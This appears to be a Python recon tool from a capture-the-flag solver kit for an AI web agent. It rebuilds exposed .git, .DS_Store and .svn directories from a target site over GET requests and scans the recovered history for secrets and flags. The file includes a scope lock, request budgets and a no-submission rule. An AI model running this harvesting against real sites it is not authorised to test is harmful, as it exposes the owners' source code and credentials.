#!/usr/bin/env python3
"""vcs_exposure (wave3/web-recon, ticket #6): GET-only reconstruction of an exposed .git / .DS_Store / .svn.

A hand tool / detector for the web agent (`briefs/web.md`). When a web root exposes a version-control
directory, this fetches the standard paths with GET requests through the caller's SCOPE-LOCKED
`solvers/toolkits/web.py` WebClient, reconstructs the tree OFFLINE, and feeds the bytes to the
existing `solvers/toolkits/repo_supply_chain.py` reader. It reports recon LEADS: the commit table,
the files, the refs, and any secret or flag the history carries.

The wire discipline and the wave3/web-recon rules (AGENTS.md "Private targets", "Untrusted content",
"Uncertain answers"):
  - GET ONLY. Every request is `client.request("GET", ...)`; no POST/PUT/DELETE/HEAD, no form, no
    header trick, redirects are NOT followed (a 3xx is a miss). The WebClient is scope-locked to the
    one in-scope target, so nothing off-host is ever contacted.
  - BOUNDED: capped request count, total bytes and object count (defaults below), so a hostile or
    huge exposure cannot run away.
  - It derives NO answer and submits NOTHING (no solve_set/signals). The result's top-level `flag`
    is always None. A secret or flag in a blob, a commit message or an svn pristine file is reported
    as a LEAD under `secrets` -- for the player to submit (CSCTF FLAG), never a
    plain answer and never auto-submitted. Found bytes are data, never instructions, and nothing
    found is executed (repo_supply_chain runs no VCS binary; this module runs nothing at all).

CLI (performs live GETs against the URL you give  -- a hand tool):
    .venv/bin/python solvers/web/vcs_exposure.py <http(s)://target/> [--git] [--ds] [--svn]
                                                 [--max-requests N] [--json]

Public API:
    reconstruct(git_tree) -> dict          OFFLINE: git_tree is {git-dir-relative path: bytes}
    dump(target, ...) -> dict              live GET-only .git reconstruction (feeds reconstruct())
    ds_store(target, ...) -> dict          live GET-only .DS_Store directory-name recon
    svn(target, ...) -> dict               live GET-only .svn working-copy recon
    recon(target, ...) -> dict             all three, merged
`target` is a WebClient the caller already built (preferred) or an http(s) URL (a scope-locked
WebClient is then built for it).
"""
import json
import re
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
_COMMON = HERE.parent / "common"

MAX_REQUESTS = 600             # GETs per dump (git can need one per object); bounded by the caller too
MAX_BYTES = 64 * 1024 * 1024   # bytes fetched over one dump
MAX_OBJECTS = 4000             # git objects fetched
MAX_ROUNDS = 80                # BFS rounds over the object graph
DS_MAX_DIRS = 64               # child directories whose .DS_Store is read when recursing
SVN_MAX_PRISTINE = 200         # pristine blobs fetched for secret scanning
_HEX = re.compile(r"\b([0-9a-f]{40}|[0-9a-f]{64})\b")


def _load(mod_name, path):
    """Load a sibling module by file path, so toolkits/email.py etc. never shadow a stdlib module."""
    try:
        import importlib.util
        spec = importlib.util.spec_from_file_location(mod_name, path)
        m = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(m)
        return m
    except Exception:
        return None


_web = _load("csctf_web", _TK / "web.py")
_rsc = _load("csctf_repo_supply_chain", _TK / "repo_supply_chain.py")
_nix = _load("csctf_nix_host", _COMMON / "nix_host.py")


# ---- GET-only, scope-locked, bounded fetcher -------------------------------------------------------

class _Getter:
    """Only ever GETs, only through a scope-locked WebClient, only within the budget. It exposes no
    other verb, so this module cannot POST or change state even by mistake."""

    def __init__(self, target, *, max_requests=MAX_REQUESTS, max_bytes=MAX_BYTES):
        if hasattr(target, "request") and hasattr(target, "get"):
            self.client = target                      # the caller's own WebClient (its scope lock, its log)
        else:
            if _web is None:
                raise RuntimeError("solvers/toolkits/web.py could not be loaded; pass a WebClient")
            self.client = _web.WebClient(str(target))  # itself scope-locked; refuses the challenge platform
        self.max_requests = int(max_requests)
        self.max_bytes = int(max_bytes)
        self.requests = 0
        self.bytes = 0
        self.refused = []        # off-scope / guarded (never sent)
        self.errors = []         # transport errors on in-scope requests
        self.vpn_required = None

    def budget_left(self):
        return self.requests < self.max_requests and self.bytes < self.max_bytes

    def get(self, path):
        """GET one in-scope path. Returns (status, body bytes) or None (budget hit, off-scope, 3xx,
        error, or empty). Redirects are never followed. VPNRequired is recorded, not raised, so a
        detector returns its partial leads rather than aborting the agent."""
        if not self.budget_left():
            return None
        OutOfScope = getattr(_web, "OutOfScope", Exception)
        VPNRequired = getattr(_web, "VPNRequired", Exception)
        try:
            r = self.client.request("GET", path, allow_redirects=False)
        except OutOfScope:
            self.refused.append(path)
            return None
        except VPNRequired as e:
            self.vpn_required = str(e)
            return None
        except Exception as e:                        # any transport/other error: record, keep going
            self.errors.append(f"{path}: {type(e).__name__}")
            return None
        self.requests += 1
        status = r.get("status")
        body = r.get("body") or b""
        if isinstance(body, str):
            body = body.encode("utf-8", "replace")
        self.bytes += len(body)
        if status != 200 or not body:
            return (status, b"")
        return (status, bytes(body))


# ---- git -------------------------------------------------------------------------------------------

_GIT_SEEDS = ("HEAD", "config", "packed-refs", "index", "ORIG_HEAD", "FETCH_HEAD", "MERGE_HEAD",
              "COMMIT_EDITMSG", "description", "logs/HEAD", "info/refs", "objects/info/packs",
              "refs/heads/master", "refs/heads/main", "refs/heads/develop", "refs/heads/dev",
              "refs/remotes/origin/HEAD", "refs/remotes/origin/master", "refs/remotes/origin/main")


def _looks_text(body):
    return body[:1] not in (b"<",) and b"<html" not in body[:200].lower()


def _hexlen(git_tree):
    cfg = git_tree.get("config", b"")
    return 64 if re.search(rb"objectformat\s*=\s*sha256", cfg, re.I) else 40


def _object_path(oid):
    return f"objects/{oid[:2]}/{oid[2:]}"


def _valid_object(raw):
    """True when raw is a readable loose git object (zlib of `<type> <len>\\0...`)."""
    try:
        data = _rsc.inflate(raw)
    except Exception:
        return False
    head = data.split(b"\x00", 1)[0]
    return head.split(b" ", 1)[0] in (b"commit", b"tree", b"blob", b"tag")


def _wanted_oids(git_tree, hexlen):
    """Every object id the loaded git tree points at, via a fresh GitRepo (refs, reflog, index,
    commit->tree/parents, tree entries, tag->object)."""
    want = set()
    try:
        repo = _rsc.GitRepo(dict(git_tree))
    except Exception:
        # fall back to scraping ids out of the ref/log/info texts
        for name, body in git_tree.items():
            if name.startswith(("refs/", "logs/")) or name in ("packed-refs", "info/refs", "ORIG_HEAD", "FETCH_HEAD", "MERGE_HEAD"):
                want.update(m.group(1) for m in _HEX.finditer(body.decode("utf-8", "replace")))
        return want, None
    hd = repo.head()
    if hd.get("id"):
        want.add(hd["id"])
    want.update(repo.refs().values())
    for e in repo.reflog():
        want.add(e.get("old")); want.add(e.get("new"))
    for _n, lst in repo.pseudo_heads().items():
        want.update(lst)
    for e in repo.index():
        want.add(e.get("id"))
    Incomplete = getattr(_rsc, "Incomplete", Exception)
    for oid, (typ, _body) in list(repo.objects.items()):
        if typ == "commit":
            c = repo.commit(oid) or {}
            if c.get("tree"):
                want.add(c["tree"])
            want.update(c.get("parents") or [])
        elif typ == "tree":
            try:
                for mode, _name, o in repo.tree_entries(oid):
                    if mode != "160000":
                        want.add(o)
            except Incomplete:
                pass
        elif typ == "tag":
            t = repo.tag(oid) or {}
            if t.get("object"):
                want.add(t["object"])
    want = {o for o in want if isinstance(o, str) and re.fullmatch(rf"[0-9a-f]{{{hexlen}}}", o)}
    return want, repo


def dump(target, *, max_requests=MAX_REQUESTS, max_bytes=MAX_BYTES, max_objects=MAX_OBJECTS,
         git_prefix="/.git/"):
    """Live, GET-only reconstruction of an exposed .git. Fetches the seed files, discovers object ids
    (refs, reflog, index, packs), walks commits->trees->blobs fetching loose objects, then hands the
    reconstructed tree to repo_supply_chain. Returns recon leads; `flag` is always None."""
    if _rsc is None:
        return _result(error="repo_supply_chain not loaded")
    g = _Getter(target, max_requests=max_requests, max_bytes=max_bytes)
    prefix = git_prefix if git_prefix.endswith("/") else git_prefix + "/"
    git_tree = {}                                     # git-dir-relative path -> bytes

    def fetch_rel(rel, *, text=True):
        got = g.get(prefix + rel)
        if not got:
            return None
        _status, body = got
        if not body:
            return None
        if text and rel != "index" and not rel.startswith("objects/") and not _looks_text(body):
            return None
        git_tree[rel] = body
        return body

    for rel in _GIT_SEEDS:
        fetch_rel(rel)

    # info/refs (dumb-http ref advertisement): "<oid>\t<refname>" -- make each a ref GitRepo can read
    for src in ("info/refs",):
        body = git_tree.get(src)
        if body:
            for line in body.decode("utf-8", "replace").splitlines():
                parts = line.split("\t")
                if len(parts) == 2 and _HEX.fullmatch(parts[0].strip()) and parts[1].startswith("refs/"):
                    git_tree.setdefault(parts[1].strip(), (parts[0].strip() + "\n").encode())

    # packfiles named by objects/info/packs ("P pack-<hash>.pack")
    packs = git_tree.get("objects/info/packs", b"").decode("utf-8", "replace")
    for m in re.finditer(r"\bpack-[0-9a-f]+\.pack\b", packs):
        name = m.group(0)
        fetch_rel(f"objects/pack/{name}", text=False)
        fetch_rel(f"objects/pack/{name[:-5]}.idx", text=False)   # not required by the reader; kept if served

    hexlen = _hexlen(git_tree)

    # BFS over the object graph, fetching missing loose objects each round
    fetched_objects = 0
    for _round in range(MAX_ROUNDS):
        if not g.budget_left() or fetched_objects >= max_objects:
            break
        want, _repo = _wanted_oids(git_tree, hexlen)
        present = {name[len("objects/"):].replace("/", "") for name in git_tree
                   if re.fullmatch(r"objects/[0-9a-f]{2}/[0-9a-f]+", name)}
        # objects inside a pack are already resolved by GitRepo; treat want not on disk as missing-loose
        missing = sorted(o for o in want if o not in present)
        progress = False
        for oid in missing:
            if not g.budget_left() or fetched_objects >= max_objects:
                break
            got = g.get(prefix + _object_path(oid))
            if not got or not got[1]:
                continue
            raw = got[1]
            if not _valid_object(raw):
                continue
            git_tree[_object_path(oid)] = raw
            fetched_objects += 1
            progress = True
        if not progress:
            break

    out = reconstruct(git_tree)
    out["fetch"] = {"requests": g.requests, "bytes": g.bytes, "objects_fetched": fetched_objects,
                    "refused_offscope": len(g.refused), "errors": g.errors[:20],
                    "vpn_required": g.vpn_required, "budget_exhausted": not g.budget_left()}
    if not git_tree:
        out["notes"].append("no .git content fetched: the path is not exposed (or needs the VPN)")
    return out


def reconstruct(git_tree):
    """OFFLINE: reconstruct and report from a git tree ({git-dir-relative path: bytes}) via
    repo_supply_chain. `flag` is always None; secrets/flags are LEADS. No request, nothing executed."""
    if _rsc is None:
        return _result(error="repo_supply_chain not loaded")
    files = {(".git/" + k): v for k, v in git_tree.items()}
    try:
        entries = _rsc.listing(files)
        repos = list(_rsc.find_git(entries))
    except Exception as e:
        return _result(error=f"reconstruction failed: {type(e).__name__}: {str(e)[:120]}")
    reports = []
    Incomplete = getattr(_rsc, "Incomplete", Exception)
    for repo in repos:
        head = {}
        try:
            head = repo.head()
        except Exception:
            pass
        commits = []
        try:
            for meta in repo.table()[:500]:
                commits.append({"id": meta.get("id"), "author": meta.get("author"),
                                "email": meta.get("email"), "time": meta.get("time"),
                                "message": (meta.get("message") or "").strip()[:200]})
        except Exception:
            pass
        file_paths = []
        if head.get("id"):
            try:
                file_paths = sorted(repo.snapshot(head["id"]).keys())[:2000]
            except (Incomplete, Exception):
                file_paths = []
        try:
            refs = {k: v for k, v in repo.refs().items()}
        except Exception:
            refs = {}
        reports.append({
            "label": getattr(repo, "label", ""),
            "complete": bool(getattr(repo, "complete", True)),
            "head": head,
            "refs": refs,
            "commits": commits,
            "commit_count": len(commits),
            "files_at_head": file_paths,
            "object_count": len(getattr(repo, "objects", {})),
            "problems": list(getattr(repo, "problems", []))[:20],
        })
    secrets = _scan_secrets(files, repos)
    notes = []
    if not repos:
        notes.append("no git repository reconstructed from the fetched bytes")
    return _result(repos=reports, secrets=secrets, notes=notes)


def _scan_secrets(files, repos):
    try:
        rows = _rsc.find_secrets(files, repos)
    except Exception:
        return []
    out = []
    for row in rows:
        where = row.get("where") or []
        first = where[0] if where else {}
        out.append({"kind": row.get("kind"), "value": row.get("value"),
                    "repo": first.get("repo"), "commit": first.get("commit"),
                    "path": first.get("path"), "state": first.get("state"),
                    "note": "lead only; never a plain answer -- a flag is the player's to submit"})
    return out


# ---- .DS_Store -------------------------------------------------------------------------------------

def ds_store(target, *, path="/.DS_Store", recurse=False, max_requests=DS_MAX_DIRS + 4,
             max_bytes=MAX_BYTES):
    """Live, GET-only .DS_Store recon: the file names a Finder store remembers are leads to hidden
    files/folders. With recurse=True, child folders' own .DS_Store are read too (bounded). `flag`
    is always None (a .DS_Store carries no secret, only names)."""
    if _nix is None:
        return _result(error="nix_host not loaded", names=[], paths=[])
    g = _Getter(target, max_requests=max_requests, max_bytes=max_bytes)
    names, discovered, seen, notes = [], [], set(), []
    queue = [(path, 0)]
    while queue:
        p, depth = queue.pop(0)
        base = p[:-len("/.DS_Store")] if p.endswith("/.DS_Store") else ""
        if p in seen or not g.budget_left():
            continue
        seen.add(p)
        got = g.get(p)
        if not got or not got[1] or not _nix.is_ds_store(got[1]):
            continue
        discovered.append(p)
        try:
            found = [n for n in _nix.ds_store_names(got[1]) if n and n != "."]
        except Exception:
            found = []
        for n in found:
            full = (base + "/" + n).replace("//", "/")
            if full not in names:
                names.append(full)
            # a child with no file extension may be a directory with its own .DS_Store
            if recurse and depth < 3 and "." not in n and len(discovered) < DS_MAX_DIRS:
                queue.append(((base + "/" + n + "/.DS_Store").replace("//", "/"), depth + 1))
    if not discovered:
        notes.append(f"no readable .DS_Store at {path} (not exposed, or needs the VPN)")
    return _result(stores=discovered, names=names,
                   fetch={"requests": g.requests, "bytes": g.bytes, "vpn_required": g.vpn_required},
                   notes=notes)


# ---- .svn ------------------------------------------------------------------------------------------

def svn(target, *, max_requests=SVN_MAX_PRISTINE + 8, max_bytes=MAX_BYTES, read_pristine=True):
    """Live, GET-only .svn recon: read the working-copy wc.db (SQLite) via repo_supply_chain to list
    its NODES (paths + checksums), then fetch the pristine blobs and scan them for secrets (LEADS).
    `flag` is always None; a found secret/flag is reported, never submitted."""
    if _rsc is None:
        return _result(error="repo_supply_chain not loaded", nodes=[])
    g = _Getter(target, max_requests=max_requests, max_bytes=max_bytes)
    nodes, secrets, notes = [], [], []
    got = g.get("/.svn/wc.db")
    db = got[1] if got else b""
    if db[:16] == b"SQLite format 3\x00":
        try:
            rows = _rsc.svn_working_copy(db)
        except Exception as e:
            rows = []
            notes.append(f"wc.db unreadable: {type(e).__name__}")
        for r in rows:
            nodes.append({"path": r.get("path"), "kind": r.get("kind"), "revision": r.get("revision"),
                          "author": r.get("author"), "checksum": r.get("checksum"),
                          "presence": r.get("presence")})
        if read_pristine:
            seen = set()
            for r in rows:
                cs = str(r.get("checksum") or "")
                m = re.search(r"([0-9a-f]{40})", cs)
                if not m or m.group(1) in seen or not g.budget_left():
                    continue
                seen.add(m.group(1))
                sha = m.group(1)
                blob = g.get(f"/.svn/pristine/{sha[:2]}/{sha}.svn-base")
                if blob and blob[1]:
                    try:
                        for kind, value, _off in _rsc.scan_secrets(blob[1]):
                            secrets.append({"kind": kind, "value": value, "path": r.get("path"),
                                            "note": "lead only; never a plain answer -- a flag is the player's to submit"})
                    except Exception:
                        pass
    else:
        got_e = g.get("/.svn/entries")
        if got_e and got_e[1]:
            notes.append("legacy .svn/entries present (old svn format); wc.db not found")
        else:
            notes.append("no readable .svn/wc.db (not exposed, or needs the VPN)")
    # dedupe secrets
    uniq, keys = [], set()
    for s in secrets:
        k = (s["kind"], s["value"])
        if k not in keys:
            keys.add(k)
            uniq.append(s)
    return _result(nodes=nodes, secrets=uniq,
                   fetch={"requests": g.requests, "bytes": g.bytes, "vpn_required": g.vpn_required},
                   notes=notes)


# ---- all three -------------------------------------------------------------------------------------

def recon(target, **kw):
    """Run the git, .DS_Store and .svn recon against one target (a WebClient is built once and reused
    so the scope lock and request log are shared). Returns {git, ds_store, svn, flag: None}."""
    client = target
    if not (hasattr(target, "request") and hasattr(target, "get")):
        if _web is None:
            return {"flag": None, "error": "web.py not loaded"}
        client = _web.WebClient(str(target))
    return {"flag": None, "git": dump(client, **kw), "ds_store": ds_store(client),
            "svn": svn(client)}


# ---- result helper (forces the never-an-answer invariant) ------------------------------------------

def _result(**fields):
    out = {"flag": None}                              # invariant: this tool never yields a flag/answer
    out.update(fields)
    out["flag"] = None
    out.setdefault("secrets", [])
    out["has_secret_leads"] = bool(out.get("secrets"))
    out.setdefault("notes", [])
    return out


# ---- CLI -------------------------------------------------------------------------------------------

def _main(argv):
    if any(a in ("-h", "--help") for a in argv):
        print(__doc__)
        return 0
    as_json = "--json" in argv
    rest = [a for a in argv if a not in ("--json", "--git", "--ds", "--svn")]
    which = {a for a in argv if a in ("--git", "--ds", "--svn")}
    max_req = MAX_REQUESTS
    url = None
    it = iter(rest)
    for a in it:
        if a == "--max-requests":
            max_req = int(next(it, MAX_REQUESTS))
        elif not a.startswith("--"):
            url = a
    if not url:
        print(__doc__)
        return 64
    out = {"flag": None}
    try:
        if not which or "--git" in which:
            out["git"] = dump(url, max_requests=max_req)
        if not which or "--ds" in which:
            out["ds_store"] = ds_store(url)
        if not which or "--svn" in which:
            out["svn"] = svn(url)
    except (OSError, ValueError, TypeError, RuntimeError) as exc:
        print(f"vcs_exposure.py: {exc}", file=sys.stderr)
        return 2
    if as_json:
        print(json.dumps(out, indent=2, default=str))
        return 0
    if "git" in out:
        g = out["git"]
        rep = (g.get("repos") or [{}])[0]
        print(f"GIT requests={g.get('fetch', {}).get('requests')} commits={rep.get('commit_count', 0)} "
              f"files={len(rep.get('files_at_head', []))} secrets={len(g.get('secrets', []))} flag=None")
        for s in g.get("secrets", []):
            print(f"    [{s['kind']}] {s['value']}  ({s.get('path') or s.get('state')})")
    if "ds_store" in out:
        print(f"DS_STORE names={len(out['ds_store'].get('names', []))} flag=None")
        for n in out["ds_store"].get("names", [])[:60]:
            print(f"    {n}")
    if "svn" in out:
        print(f"SVN nodes={len(out['svn'].get('nodes', []))} secrets={len(out['svn'].get('secrets', []))} flag=None")
    return 0


if __name__ == "__main__":
    raise SystemExit(_main(sys.argv[1:]))
